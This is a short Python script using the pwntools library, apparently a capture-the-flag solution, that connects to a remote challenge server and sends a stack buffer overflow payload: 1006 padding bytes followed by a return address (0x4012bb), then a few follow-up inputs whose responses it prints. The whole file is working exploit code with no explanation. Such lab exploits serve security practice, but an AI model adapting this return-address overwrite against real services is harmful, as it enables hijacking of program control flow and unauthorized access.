#!/usr/bin/env python3

from pwn import *

proc = remote('0.cloud.chals.io',19267)

buffer = 1006

zip_to_end = '0x00000000004012bb'

payload = b'A'*buffer + b'\xbb\x12\x40\x00\x00\x00\x00\x00'

proc.recv(timeout=0.1)
proc.sendline(payload)
proc.recvuntil(b's?')
proc.recv()
proc.sendline(b'200')
print(proc.recv())
proc.sendline(b'1')
print(proc.recv())